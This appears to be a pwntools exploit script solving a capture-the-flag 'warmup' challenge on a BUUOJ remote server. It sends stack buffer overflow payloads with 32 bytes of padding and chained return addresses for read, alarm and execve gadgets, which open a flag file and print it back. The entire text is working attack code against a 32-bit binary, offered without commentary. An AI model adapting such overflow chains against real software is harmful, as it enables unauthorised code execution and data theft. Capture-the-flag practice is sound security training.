from pwn import *

# p = process('./warmup')
p = remote('node4.buuoj.cn', 29923)
elf = ELF('./warmup')
context.arch = 'i386'

read_addr = 0x0804811D
write_addr = 0x08048135
bss_addr = 0x080491BC
main_addr = 0x0804815a
alarm_addr = 0x0804810D
execve_addr = 0x0804813A

payload = b'a' * 32 + p32(read_addr) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(0x100)
p.send(payload)
p.send(b'./flag\00')
sleep(5)
payload = b'a' * 32 + p32(alarm_addr) + p32(execve_addr) + p32(main_addr) + p32(bss_addr) + p32(0)
p.send(payload)
payload = b'a' * 32 + p32(read_addr) + p32(main_addr) + p32(3) + p32(bss_addr) + p32(0x100)
p.send(payload)
payload = b'a' * 32 + p32(write_addr) + p32(main_addr) + p32(1) + p32(bss_addr) + p32(0x100)
p.send(payload)
p.interactive()
